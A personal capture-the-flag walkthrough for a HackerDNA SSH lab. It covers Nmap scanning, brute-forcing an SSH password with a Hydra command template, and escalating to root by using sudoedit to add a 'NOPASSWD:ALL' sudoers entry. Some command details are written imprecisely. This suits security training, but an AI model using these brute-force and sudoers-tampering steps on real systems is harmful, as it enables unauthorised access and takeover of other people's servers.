---
dg-publish: true
---
Step into the shoes of a penetration tester and tackle this realistic SSH-based challenge. This server might look secure from the outside, but weak credentials and dangerous sudo configurations could be your ticket to complete system compromise. 🎯 Master the art of reconnaissance, brute-force attacks, and privilege escalation in this hands-on Linux exploitation scenario

Link to Lab: https://hackerdna.com/labs/matsudo

1) USER FLAG
2) Ran NMAP on Target IP
	1) ![[Pasted image 20260626091004.png]]
	2) Connected to SSH using Anonymous Credentials
		1) Saw that owner of servers name is Charlie
		2) Could not connect via anonymous any further
	3) Use Hydra to Brute-Force SSH Password
		1) `hydra -l [username] -P [path_to_wordlist] ssh://[target_ip]
			1) User Name: charlie 
			2) PW: ?????
	4) SSH into system using credentials
	5) Search system for user flag and enter into portal

3) ROOT FLAG
	1) Ran `sudo -l` to see user permissions on device
		1) User has access to Sudo Edit
	2) Use permissions to edit Sudoers file and give user root access
		1) Edit /etc/sudoers using sudoedit
			1) `sudoedit Sudoers`
		2) Add proper permissions for user in user access section
			1) `charlie=(ALL) NOPASSWD:ALL`
	3) Check to see if root escalation worked
		1) `sudo su -`
		2) `whoami=root`
	4) Located root flag and submit to portal

